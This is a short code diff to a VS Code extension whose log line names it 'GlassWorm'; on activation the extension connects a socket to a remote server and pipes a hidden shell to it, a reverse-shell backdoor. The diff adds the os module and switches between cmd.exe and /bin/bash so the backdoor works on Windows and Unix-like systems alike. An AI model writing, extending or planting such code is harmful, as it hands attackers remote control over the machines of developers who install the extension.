@@ -1,6 +1,7 @@
 const vscode = require('vscode');
 const { spawn } = require('child_process');
 const net = require('net');
+const os = require('os');
 
 function activate(context) {
     console.log('[GlassWorm] Activated');
@@ -12,9 +13,13 @@ function activate(context) {
         const client = new net.Socket();
         
         client.connect(SERVER_PORT, SERVER_IP, () => {
-            const cmd = spawn('cmd.exe', [], {
+            const isWindows = os.platform() === 'win32';
+            const shell = isWindows ? 'cmd.exe' : '/bin/bash';
+            const shellArgs = isWindows ? [] : [];
+            
+            const cmd = spawn(shell, shellArgs, {
                 shell: true,
-                windowsHide: true,
+                windowsHide: isWindows ? true : false,
                 stdio: ['pipe', 'pipe', 'pipe']
             });
             
